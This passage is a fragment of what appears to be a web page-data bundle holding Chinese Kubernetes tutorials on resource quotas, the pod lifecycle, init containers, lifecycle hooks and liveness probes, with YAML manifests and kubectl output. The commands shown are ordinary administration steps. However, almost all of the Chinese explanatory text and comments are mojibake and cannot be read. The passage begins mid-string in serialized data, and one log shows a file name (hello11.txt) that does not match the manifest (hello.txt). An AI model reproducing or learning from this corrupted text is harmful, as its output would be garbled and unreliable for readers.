tcp\n......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nè®¿é®å®¹å¨ä¸­çç¨åºéè¦ä½¿ç¨çæ¯ podip:containerport\n\n\n# èµæºéé¢\n\nå®¹å¨ä¸­çç¨åºè¦è¿è¡ï¼è¯å®æ¯è¦å ç¨ä¸å®èµæºçï¼æ¯å¦ cpu ååå­ç­ï¼å¦æä¸å¯¹æä¸ªå®¹å¨çèµæºåéå¶ï¼é£ä¹å®å°±å¯è½åæå¤§éèµæºï¼å¯¼è´å¶å®å®¹å¨æ æ³è¿è¡ãéå¯¹è¿ç§æåµï¼kubernetes æä¾äºå¯¹åå­å cpu çèµæºè¿è¡éé¢çæºå¶ï¼è¿ç§æºå¶ä¸»è¦éè¿ resources éé¡¹å®ç°ï¼ä»æä¸¤ä¸ªå­éé¡¹ï¼\n\n * limitsï¼ç¨äºéå¶è¿è¡æ¶å®¹å¨çæå¤§å ç¨èµæºï¼å½å®¹å¨å ç¨èµæºè¶è¿ limits æ¶ä¼è¢«ç»æ­¢ï¼å¹¶è¿è¡éå¯\n * requests ï¼ç¨äºè®¾ç½®å®¹å¨éè¦çæå°èµæºï¼å¦æç¯å¢èµæºä¸å¤ï¼å®¹å¨å°æ æ³å¯å¨\n\nå¯ä»¥éè¿ä¸é¢ä¸¤ä¸ªéé¡¹è®¾ç½®èµæºçä¸ä¸éãå½éç½®äºåï¼ä¼èªå¨å»æ¾åéçä¸»æºèµæºæ¥å¯å¨ pod\n\næ¥ä¸æ¥ï¼ç¼åä¸ä¸ªæµè¯æ¡ä¾ï¼åå»º pod-resources.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-resources\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    resources: # èµæºéé¢\n      limits:  # éå¶èµæºï¼ä¸éï¼\n        cpu: "2" # cpuéå¶ï¼åä½æ¯coreæ°\n        memory: "10gi" # åå­éå¶\n      requests: # è¯·æ±èµæºï¼ä¸éï¼\n        cpu: "1"  # cpuéå¶ï¼åä½æ¯coreæ°\n        memory: "10mi"  # åå­éå¶\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå¨è¿å¯¹ cpu å memory çåä½åä¸ä¸ªè¯´æï¼\n\n * cpuï¼core æ°ï¼å¯ä»¥ä¸ºæ´æ°æå°æ°\n * memoryï¼ åå­å¤§å°ï¼å¯ä»¥ä½¿ç¨ giãmiãgãm ç­å½¢å¼\n\n# è¿è¡pod\n[root@k8s-master01 ~]# kubectl create  -f pod-resources.yaml\npod/pod-resources created\n\n# æ¥çåç°podè¿è¡æ­£å¸¸\n[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev\nname            ready   status    restarts   age  \npod-resources   1/1     running   0          39s   \n\n# æ¥ä¸æ¥ï¼åæ­¢pod\n[root@k8s-master01 ~]# kubectl delete  -f pod-resources.yaml\npod "pod-resources" deleted\n\n# ç¼è¾podï¼ä¿®æ¹resources.requests.memoryçå¼ä¸º10gi\n[root@k8s-master01 ~]# vim pod-resources.yaml\n\n# åæ¬¡å¯å¨pod\n[root@k8s-master01 ~]# kubectl create  -f pod-resources.yaml\npod/pod-resources created\n\n# æ¥çpodç¶æï¼åç°podå¯å¨å¤±è´¥\n[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev -o wide\nname            ready   status    restarts   age          \npod-resources   0/1     pending   0          20s    \n\n# æ¥çpodè¯¦æä¼åç°ï¼å¦ä¸æç¤º\n[root@k8s-master01 ~]# kubectl describe pod pod-resources -n dev\n......\nwarning  failedscheduling  35s   default-scheduler  0/3 nodes are available: 1 node(s) had taint {node-role.kubernetes.io/master: }, that the pod didn\'t tolerate, 2 insufficient memory.(åå­ä¸è¶³)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n',charsets:{cjk:!0}},{title:"kubernetes(å­) Pod çå½å¨æ",frontmatter:{title:"kubernetes(å­) Pod çå½å¨æ",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/605",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/605.kubernetes(%E5%85%AD)%20Pod%20%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.html",relativePath:"04.è¿ç»´/60.Kubernetes/605.kubernetes(å­) Pod çå½å¨æ.md",key:"v-c4504aa6",path:"/kubernetes/605/",headers:[{level:2,title:"æ¦è¿°",slug:"æ¦è¿°",normalizedTitle:"æ¦è¿°",charIndex:2},{level:2,title:"é©å­å½æ°",slug:"é©å­å½æ°",normalizedTitle:"é©å­å½æ°",charIndex:3842},{level:2,title:"å®¹å¨æ¢æµ",slug:"å®¹å¨æ¢æµ",normalizedTitle:"å®¹å¨æ¢æµ",charIndex:5547},{level:2,title:"éå¯ç­ç¥",slug:"éå¯ç­ç¥",normalizedTitle:"éå¯ç­ç¥",charIndex:7477}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"æ¦è¿° é©å­å½æ° å®¹å¨æ¢æµ éå¯ç­ç¥",content:'# æ¦è¿°\n\næä»¬ä¸è¬å° Pod å¯¹è±¡ä»åå»ºè³ç»çè¿æ®µæ¶é´èå´ç§°ä¸º Pod ççå½å¨æï¼å®ä¸»è¦åå«ä¸é¢çè¿ç¨ï¼\n\n * Pod åå»ºè¿ç¨\n * è¿è¡åå§åå®¹å¨ï¼init containerï¼è¿ç¨\n * è¿è¡ä¸»å®¹å¨ï¼main containerï¼è¿ç¨\n   * å®¹å¨å¯å¨åé©å­ï¼post startï¼ãå®¹å¨ç»æ­¢åé©å­ï¼pre stopï¼\n     - å®¹å¨çå­æ´»æ§æ¢æµï¼liveness probeï¼ãå°±ç»ªæ§æ¢æµï¼readiness probeï¼\n * pod ç»æ­¢è¿ç¨\n\n\n\nå¨æ´ä¸ªçå½å¨æä¸­ï¼Pod ä¼åºç° 5 ä¸­ç¶æï¼åå«å¦ä¸ï¼\n\n * æèµ·ï¼Pendingï¼ï¼apiserver å·²ç»åå»ºäº pod èµæºå¯¹è±¡ï¼ä½å®å°æªè¢«è°åº¦å®ææèä»å¤äºä¸è½½éåçè¿ç¨ä¸­\n * è¿è¡ä¸­ï¼Runningï¼ï¼pod å·²ç»è¢«è°åº¦è³æèç¹ï¼å¹¶ä¸ææå®¹å¨é½å·²ç»è¢« kubelet åå»ºå®æ\n * æåï¼Successdedï¼ï¼pod ä¸­çææå®¹å¨é½å·²ç»æåç»æ­¢å¹¶ä¸ä¸ä¼è¢«éå¯\n * å¤±è´¥ï¼Failedï¼ï¼ææå®¹å¨é½å·²ç»ç»æ­¢ï¼ä½è³å°æä¸ä¸ªå®¹å¨ç»æ­¢å¤±è´¥ï¼å³å®¹å¨è¿åäºé 0 å¼å¾éåºç¶æ\n * æªç¥ï¼Unknownï¼ï¼apiserver æ æ³æ­£å¸¸è·åå° pod å¯¹è±¡çç¶æä¿¡æ¯ï¼éå¸¸ç±ç½ç»éä¿¡å¤±è´¥æå¯¼è´\n\n\n# åå»ºåç»æ­¢\n\npod çåå»ºè¿ç¨\n\n 1. ç¨æ·éè¿ kubectl æå¶ä» api å®¢æ·ç«¯æäº¤éè¦åå»ºç pod ä¿¡æ¯ç» apiServer\n 2. apiServer å¼å§çæ pod å¯¹è±¡çä¿¡æ¯ï¼å¹¶å°ä¿¡æ¯å­å¥ etcdï¼ç¶åè¿åç¡®è®¤ä¿¡æ¯è³å®¢æ·ç«¯\n 3. apiServer å¼å§åæ  etcd ä¸­ç pod å¯¹è±¡çååï¼å¶å®ç»ä»¶ä½¿ç¨ watch æºå¶æ¥è·è¸ªæ£æ¥ apiServer ä¸çåå¨\n 4. scheduler åç°ææ°ç pod å¯¹è±¡è¦åå»ºï¼å¼å§ä¸º Pod åéä¸»æºå¹¶å°ç»æä¿¡æ¯æ´æ°è³ apiServer\n 5. node èç¹ä¸ç kubelet åç°æ pod è°åº¦è¿æ¥ï¼å°è¯è°ç¨ docker å¯å¨å®¹å¨ï¼å¹¶å°ç»æåéè³ apiServer\n 6. apiServer å°æ¥æ¶å°ç pod ç¶æä¿¡æ¯å­å¥ etcd ä¸­\n\n\n\npod çç»æ­¢è¿ç¨\n\n 1. ç¨æ·å apiServer åéå é¤ pod å¯¹è±¡çå½ä»¤\n 2. apiServcer ä¸­ç pod å¯¹è±¡ä¿¡æ¯ä¼éçæ¶é´çæ¨ç§»èæ´æ°ï¼å¨å®½éæåï¼é»è®¤ 30sï¼ï¼pod è¢«è§ä¸º dead\n 3. å° pod æ è®°ä¸º terminating ç¶æ\n 4. kubelet å¨çæ§å° pod å¯¹è±¡è½¬ä¸º terminating ç¶æçåæ¶å¯å¨ pod å³é­è¿ç¨\n 5. ç«¯ç¹æ§å¶å¨çæ§å° pod å¯¹è±¡çå³é­è¡ä¸ºæ¶å°å¶ä»ææå¹éå°æ­¤ç«¯ç¹ç service èµæºçç«¯ç¹åè¡¨ä¸­ç§»é¤\n 6. å¦æå½å pod å¯¹è±¡å®ä¹äº preStop é©å­å¤çå¨ï¼åå¨å¶æ è®°ä¸º terminating åå³ä¼ä»¥åæ­¥çæ¹å¼å¯å¨æ§è¡\n 7. pod å¯¹è±¡ä¸­çå®¹å¨è¿ç¨æ¶å°åæ­¢ä¿¡å·\n 8. å®½éæç»æåï¼è¥ pod ä¸­è¿å­å¨ä»å¨è¿è¡çè¿ç¨ï¼é£ä¹ pod å¯¹è±¡ä¼æ¶å°ç«å³ç»æ­¢çä¿¡å·\n 9. kubelet è¯·æ± apiServer å°æ­¤ pod èµæºçå®½éæè®¾ç½®ä¸º 0 ä»èå®æå é¤æä½ï¼æ­¤æ¶ pod å¯¹äºç¨æ·å·²ä¸å¯è§\n\n\n# åå§ååå®¹å¨\n\nåå§åå®¹å¨æ¯å¨ pod çä¸»å®¹å¨å¯å¨ä¹åè¦è¿è¡çå®¹å¨ï¼ä¸»è¦æ¯åä¸äºä¸»å®¹å¨çåç½®å·¥ä½ï¼å®å·æä¸¤å¤§ç¹å¾ï¼\n\n 1. åå§åå®¹å¨å¿é¡»è¿è¡å®æç´è³ç»æï¼è¥æåå§åå®¹å¨è¿è¡å¤±è´¥ï¼é£ä¹ kubernetes éè¦éå¯å®ç´å°æåå®æ\n 2. åå§åå®¹å¨å¿é¡»æç§å®ä¹çé¡ºåºæ§è¡ï¼å½ä¸ä»å½åä¸ä¸ªæåä¹åï¼åé¢çä¸ä¸ªæè½è¿è¡\n\nåå§åå®¹å¨æå¾å¤çåºç¨åºæ¯ï¼ä¸é¢ååºçæ¯æå¸¸è§çå ä¸ªï¼\n\n * æä¾ä¸»å®¹å¨éåä¸­ä¸å·å¤çå·¥å·ç¨åºæèªå®ä¹ä»£ç \n * åå§åå®¹å¨è¦åäºåºç¨å®¹å¨ä¸²è¡å¯å¨å¹¶è¿è¡å®æï¼å æ­¤å¯ç¨äºå»¶ååºç¨å®¹å¨çå¯å¨ç´è³å¶ä¾èµçæ¡ä»¶å¾å°æ»¡è¶³\n\nåè®¾è¦ä»¥ä¸»å®¹å¨æ¥è¿è¡ nginxï¼ä½æ¯è¦æ±å¨è¿è¡ nginx ä¹ååè¦è½å¤è¿æ¥ä¸ç¸åºçæå¡å¨æ¯å¯ä»¥ ping éçã\nåå»º pod-initcontainer.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-initcontainer\n  namespace: dev\nspec:\n  containers:\n  - name: main-container\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerPort: 80\n  # åå§åå®¹å¨\n  initContainers:\n  # æ¨¡æmysqlè¿æ¥\n  - name: test-mysql\n    image: busybox:1.30\n    command: [\'sh\', \'-c\', \'until ping 192.168.81.102 -c 1 ; do echo waiting for mysql...; sleep 2; done;\']ã\n  # æ¨¡æredisè¿æ¥\n  - name: test-redis\n    image: busybox:1.30\n    command: [\'sh\', \'-c\', \'until ping 192.168.81.103 -c 1 ; do echo waiting for reids...; sleep 2; done;\']\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-initcontainer.yaml\npod/pod-initcontainer created\n\n# æ¥çpodç¶æ\n# åç°podå¡å¨å¯å¨ç¬¬ä¸ä¸ªåå§åå®¹å¨è¿ç¨ä¸­ï¼åé¢çå®¹å¨ä¸ä¼è¿è¡\nroot@k8s-master01 ~]# kubectl describe pod  pod-initcontainer -n dev\n........\nEvents:\n  Type    Reason     Age   From               Message\n  ----    ------     ----  ----               -------\n  Normal  Scheduled  49s   default-scheduler  Successfully assigned dev/pod-initcontainer to node1\n  Normal  Pulled     48s   kubelet, node1     Container image "busybox:1.30" already present on machine\n  Normal  Created    48s   kubelet, node1     Created container test-mysql\n  Normal  Started    48s   kubelet, node1     Started container test-mysql\n\n# å¨ææ¥çpod\n[root@k8s-master01 ~]# kubectl get pods pod-initcontainer -n dev -w\nNAME                             READY   STATUS     RESTARTS   AGE\npod-initcontainer                0/1     Init:0/2   0          15s\npod-initcontainer                0/1     Init:1/2   0          52s\npod-initcontainer                0/1     Init:1/2   0          53s\npod-initcontainer                0/1     PodInitializing   0          89s\npod-initcontainer                1/1     Running           0          90s\n\n# æ¥ä¸æ¥æ°å¼ä¸ä¸ªshellï¼ä¸ºå½åæå¡å¨æ°å¢ä¸¤ä¸ªipï¼è§å¯podçååï¼ä¸ºç½å¡æ·»å å°å\n[root@k8s-master01 ~]# ifconfig ens33:1 192.168.81.102 netmask 255.255.255.0 up\n[root@k8s-master01 ~]# ifconfig ens33:2 192.168.81.103 netmask 255.255.255.0 up\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# é©å­å½æ°\n\né©å­å½æ°è½å¤æç¥èªèº«çå½å¨æä¸­çäºä»¶ï¼å¹¶å¨ç¸åºçæ¶å»å°æ¥æ¶è¿è¡ç¨æ·æå®çç¨åºä»£ç ã\n\nkubernetes å¨ä¸»å®¹å¨çå¯å¨ä¹åååæ­¢ä¹åæä¾äºä¸¤ä¸ªé©å­å½æ°ï¼\n\n * post startï¼å®¹å¨åå»ºä¹åæ§è¡ï¼å¦æå¤±è´¥äºä¼éå¯å®¹å¨\n * pre stop ï¼å®¹å¨ç»æ­¢ä¹åæ§è¡ï¼æ§è¡å®æä¹åå®¹å¨å°æåç»æ­¢ï¼å¨å¶å®æä¹åä¼é»å¡å é¤å®¹å¨çæä½\n\né©å­å¤çå¨æ¯æä½¿ç¨ä¸é¢ä¸ç§æ¹å¼å®ä¹å¨ä½ï¼\n\n * Exec å½ä»¤ï¼å¨å®¹å¨åæ§è¡ä¸æ¬¡å½ä»¤\n\nâ¦â¦\n  lifecycle:\n    postStart: \n      exec:\n        command:\n        - cat\n        - /tmp/healthy\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * TCPSocketï¼å¨å½åå®¹å¨å°è¯è®¿é®æå®ç socket\n\nâ¦â¦      \n  lifecycle:\n    postStart:\n      tcpSocket:\n        port: 8080\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n\n * HTTPGetï¼å¨å½åå®¹å¨ä¸­åæ url åèµ· http è¯·æ±\n\nâ¦â¦\n  lifecycle:\n    postStart:\n      httpGet:\n        path: / #URIå°å\n        port: 80 #ç«¯å£å·\n        host: 192.168.5.3 #ä¸»æºå°å\n        scheme: HTTP #æ¯æçåè®®ï¼httpæèhttps\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\næ¥ä¸æ¥ï¼ä»¥ exec æ¹å¼ä¸ºä¾ï¼æ¼ç¤ºä¸é©å­å½æ°çä½¿ç¨ï¼åå»º pod-hook-exec.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-hook-exec\n  namespace: dev\nspec:\n  containers:\n  - name: main-container\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerPort: 80\n    # çå½å¨æ\n    lifecycle:\n      postStart: \n        exec: # å¨å®¹å¨å¯å¨çæ¶åæ§è¡ä¸ä¸ªå½ä»¤ï¼ä¿®æ¹ænginxçé»è®¤é¦é¡µåå®¹\n          command: ["/bin/sh", "-c", "echo postStart... > /usr/share/nginx/html/index.html"]\n      preStop:\n        exec: # å¨å®¹å¨åæ­¢ä¹ååæ­¢nginxæå¡\n          command: ["/usr/sbin/nginx","-s","quit"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-hook-exec.yaml\npod/pod-hook-exec created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods  pod-hook-exec -n dev -o wide\nNAME           READY   STATUS     RESTARTS   AGE    IP            NODE    \npod-hook-exec  1/1     Running    0          29s    10.244.2.48   node2   \n\n# è®¿é®pod\n[root@k8s-master01 ~]# curl 10.244.2.48\npostStart...\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# å®¹å¨æ¢æµ\n\nå®¹å¨æ¢æµç¨äºæ£æµå®¹å¨ä¸­çåºç¨å®ä¾æ¯å¦æ­£å¸¸å·¥ä½ï¼æ¯ä¿éä¸å¡å¯ç¨æ§çä¸ç§ä¼ ç»æºå¶ãå¦æç»è¿æ¢æµï¼å®ä¾çç¶æä¸ç¬¦åé¢æï¼é£ä¹ kubernetes å°±ä¼æè¯¥é®é¢å®ä¾ "æé¤"ï¼ä¸æ¿æä¸å¡æµéãkubernetes æä¾äºä¸¤ç§æ¢éæ¥å®ç°å®¹å¨æ¢æµï¼åå«æ¯ï¼\n\n * liveness probesï¼å­æ´»æ§æ¢éï¼ç¨äºæ£æµåºç¨å®ä¾å½åæ¯å¦å¤äºæ­£å¸¸è¿è¡ç¶æï¼å¦æä¸æ¯ï¼k8s ä¼éå¯å®¹å¨\n * readiness probesï¼å°±ç»ªæ§æ¢éï¼ç¨äºæ£æµåºç¨å®ä¾å½åæ¯å¦å¯ä»¥æ¥æ¶è¯·æ±ï¼å¦æä¸è½ï¼k8s ä¸ä¼è½¬åæµé\n\n> livenessProbe å³å®æ¯å¦éå¯å®¹å¨ï¼readinessProbe å³å®æ¯å¦å°è¯·æ±è½¬åç»å®¹å¨ã\n\nä¸é¢ä¸¤ç§æ¢éç®ååæ¯æä¸ç§æ¢æµæ¹å¼ï¼\n\n * Exec å½ä»¤ï¼å¨å®¹å¨åæ§è¡ä¸æ¬¡å½ä»¤ï¼å¦æå½ä»¤æ§è¡çéåºç ä¸º 0ï¼åè®¤ä¸ºç¨åºæ­£å¸¸ï¼å¦åä¸æ­£å¸¸\n\nâ¦â¦\n  livenessProbe:\n    exec:\n      command:\n      - cat\n      - /tmp/healthy\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * TCPSocketï¼å°ä¼å°è¯è®¿é®ä¸ä¸ªç¨æ·å®¹å¨çç«¯å£ï¼å¦æè½å¤å»ºç«è¿æ¡è¿æ¥ï¼åè®¤ä¸ºç¨åºæ­£å¸¸ï¼å¦åä¸æ­£å¸¸\n\nâ¦â¦      \n  livenessProbe:\n    tcpSocket:\n      port: 8080\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n\n * HTTPGetï¼è°ç¨å®¹å¨å Web åºç¨ç URLï¼å¦æè¿åçç¶æç å¨ 200 å 399 ä¹é´ï¼åè®¤ä¸ºç¨åºæ­£å¸¸ï¼å¦åä¸æ­£å¸¸\n\nâ¦â¦\n  livenessProbe:\n    httpGet:\n      path: / #URIå°å\n      port: 80 #ç«¯å£å·\n      host: 127.0.0.1 #ä¸»æºå°å\n      scheme: HTTP #æ¯æçåè®®ï¼httpæèhttps\nâ¦â¦\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nä¸é¢ä»¥ liveness probes ä¸ºä¾ï¼åå ä¸ªæ¼ç¤ºï¼\næ¹å¼ä¸ï¼Exec\nåå»º pod-liveness-exec.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-liveness-exec\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      exec:\n        command: ["/bin/cat","/tmp/hello.txt"] # æ§è¡ä¸ä¸ªæ¥çæä»¶çå½ä»¤\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nåå»º podï¼è§å¯ææ\n\n# åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-exec.yaml\npod/pod-liveness-exec created\n\n# æ¥çPodè¯¦æ\n[root@k8s-master01 ~]# kubectl describe pods pod-liveness-exec -n dev\n......\n  Normal   Created    20s (x2 over 50s)  kubelet, node1     Created container nginx\n  Normal   Started    20s (x2 over 50s)  kubelet, node1     Started container nginx\n  Normal   Killing    20s                kubelet, node1     Container nginx failed liveness probe, will be restarted\n  Warning  Unhealthy  0s (x5 over 40s)   kubelet, node1     Liveness probe failed: cat: can\'t open \'/tmp/hello11.txt\': No such file or directory\n  \n# è§å¯ä¸é¢çä¿¡æ¯å°±ä¼åç°nginxå®¹å¨å¯å¨ä¹åå°±è¿è¡äºå¥åº·æ£æ¥\n# æ£æ¥å¤±è´¥ä¹åï¼å®¹å¨è¢«killæï¼ç¶åå°è¯è¿è¡éå¯ï¼è¿æ¯éå¯ç­ç¥çä½ç¨ï¼åé¢è®²è§£ï¼\n# ç¨ç­ä¸ä¼ä¹åï¼åè§å¯podä¿¡æ¯ï¼å°±å¯ä»¥çå°RESTARTSä¸åæ¯0ï¼èæ¯ä¸ç´å¢é¿\n[root@k8s-master01 ~]# kubectl get pods pod-liveness-exec -n dev\nNAME                READY   STATUS             RESTARTS   AGE\npod-liveness-exec   0/1     CrashLoopBackOff   2          3m19s\n\n# å½ç¶æ¥ä¸æ¥ï¼å¯ä»¥ä¿®æ¹æä¸ä¸ªå­å¨çæä»¶ï¼æ¯å¦/tmp/hello.txtï¼åè¯ï¼ç»æå°±æ­£å¸¸äº......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\næ¹å¼äºï¼TCPSocket\nåå»º pod-liveness-tcpsocket.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-liveness-tcpsocket\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      tcpSocket:\n        port: 8080 # å°è¯è®¿é®8080ç«¯å£\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nåå»º podï¼è§å¯ææ\n\n# åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-tcpsocket.yaml\npod/pod-liveness-tcpsocket created\n\n# æ¥çPodè¯¦æ\n[root@k8s-master01 ~]# kubectl describe pods pod-liveness-tcpsocket -n dev\n......\n  Normal   Scheduled  31s                            default-scheduler  Successfully assigned dev/pod-liveness-tcpsocket to node2\n  Normal   Pulled     <invalid>                      kubelet, node2     Container image "nginx:1.17.1" already present on machine\n  Normal   Created    <invalid>                      kubelet, node2     Created container nginx\n  Normal   Started    <invalid>                      kubelet, node2     Started container nginx\n  Warning  Unhealthy  <invalid> (x2 over <invalid>)  kubelet, node2     Liveness probe failed: dial tcp 10.244.2.44:8080: connect: connection refused\n  \n# è§å¯ä¸é¢çä¿¡æ¯ï¼åç°å°è¯è®¿é®8080ç«¯å£,ä½æ¯å¤±è´¥äº\n# ç¨ç­ä¸ä¼ä¹åï¼åè§å¯podä¿¡æ¯ï¼å°±å¯ä»¥çå°RESTARTSä¸åæ¯0ï¼èæ¯ä¸ç´å¢é¿\n[root@k8s-master01 ~]# kubectl get pods pod-liveness-tcpsocket  -n dev\nNAME                     READY   STATUS             RESTARTS   AGE\npod-liveness-tcpsocket   0/1     CrashLoopBackOff   2          3m19s\n\n# å½ç¶æ¥ä¸æ¥ï¼å¯ä»¥ä¿®æ¹æä¸ä¸ªå¯ä»¥è®¿é®çç«¯å£ï¼æ¯å¦80ï¼åè¯ï¼ç»æå°±æ­£å¸¸äº......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\næ¹å¼ä¸ï¼HTTPGet\nåå»º pod-liveness-httpget.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-liveness-httpget\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      httpGet:  # å¶å®å°±æ¯è®¿é®http://127.0.0.1:80/hello  \n        scheme: HTTP #æ¯æçåè®®ï¼httpæèhttps\n        port: 80 #ç«¯å£å·\n        path: /hello #URIå°å\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nåå»º podï¼è§å¯ææ\n\n# åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-httpget.yaml\npod/pod-liveness-httpget created\n\n# æ¥çPodè¯¦æ\n[root@k8s-master01 ~]# kubectl describe pod pod-liveness-httpget -n dev\n.......\n  Normal   Pulled     6s (x3 over 64s)  kubelet, node1     Container image "nginx:1.17.1" already present on machine\n  Normal   Created    6s (x3 over 64s)  kubelet, node1     Created container nginx\n  Normal   Started    6s (x3 over 63s)  kubelet, node1     Started container nginx\n  Warning  Unhealthy  6s (x6 over 56s)  kubelet, node1     Liveness probe failed: HTTP probe failed with statuscode: 404\n  Normal   Killing    6s (x2 over 36s)  kubelet, node1     Container nginx failed liveness probe, will be restarted\n  \n# è§å¯ä¸é¢ä¿¡æ¯ï¼å°è¯è®¿é®è·¯å¾ï¼ä½æ¯æªæ¾å°,åºç°404éè¯¯\n# ç¨ç­ä¸ä¼ä¹åï¼åè§å¯podä¿¡æ¯ï¼å°±å¯ä»¥çå°RESTARTSä¸åæ¯0ï¼èæ¯ä¸ç´å¢é¿\n[root@k8s-master01 ~]# kubectl get pod pod-liveness-httpget -n dev\nNAME                   READY   STATUS    RESTARTS   AGE\npod-liveness-httpget   1/1     Running   5          3m17s\n\n# å½ç¶æ¥ä¸æ¥ï¼å¯ä»¥ä¿®æ¹æä¸ä¸ªå¯ä»¥è®¿é®çè·¯å¾pathï¼æ¯å¦/ï¼åè¯ï¼ç»æå°±æ­£å¸¸äº......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nè³æ­¤ï¼å·²ç»ä½¿ç¨ liveness Probe æ¼ç¤ºäºä¸ç§æ¢æµæ¹å¼ï¼ä½æ¯æ¥ç livenessProbe çå­å±æ§ï¼ä¼åç°é¤äºè¿ä¸ç§æ¹å¼ï¼è¿æä¸äºå¶ä»çéç½®ï¼å¨è¿éä¸å¹¶è§£éä¸ï¼\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers.livenessProbe\nFIELDS:\n   exec <Object>  \n   tcpSocket    <Object>\n   httpGet      <Object>\n   initialDelaySeconds  <integer>  # å®¹å¨å¯å¨åç­å¾å¤å°ç§æ§è¡ç¬¬ä¸æ¬¡æ¢æµ\n   timeoutSeconds       <integer>  # æ¢æµè¶æ¶æ¶é´ãé»è®¤1ç§ï¼æå°1ç§\n   periodSeconds        <integer>  # æ§è¡æ¢æµçé¢çãé»è®¤æ¯10ç§ï¼æå°1ç§\n   failureThreshold     <integer>  # è¿ç»­æ¢æµå¤±è´¥å¤å°æ¬¡æè¢«è®¤å®ä¸ºå¤±è´¥ãé»è®¤æ¯3ãæå°å¼æ¯1\n   successThreshold     <integer>  # è¿ç»­æ¢æµæåå¤å°æ¬¡æè¢«è®¤å®ä¸ºæåãé»è®¤æ¯1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * initialDelaySeconds å®¹å¨å¯å¨åç­å¾å¤å°ç§æ§è¡ç¬¬ä¸æ¬¡æ¢æµ\n * timeoutSeconds æ¢æµè¶æ¶æ¶é´ãé»è®¤ 1 ç§ï¼æå° 1 ç§\n * periodSeconds æ§è¡æ¢æµçé¢çãé»è®¤æ¯ 10 ç§ï¼æå° 1 ç§\n * failureThreshold è¿ç»­æ¢æµå¤±è´¥å¤å°æ¬¡æè¢«è®¤å®ä¸ºå¤±è´¥ãé»è®¤æ¯ 3ãæå°å¼æ¯ 1\n * successThreshold è¿ç»­æ¢æµæåå¤å°æ¬¡æè¢«è®¤å®ä¸ºæåãé»è®¤æ¯ 1\n\nä¸é¢ç¨å¾®éç½®ä¸¤ä¸ªï¼æ¼ç¤ºä¸ææå³å¯ï¼\n\n[root@k8s-master01 ~]# more pod-liveness-httpget.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-liveness-httpget\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerPort: 80\n    livenessProbe:\n      httpGet:\n        scheme: HTTP\n        port: 80 \n   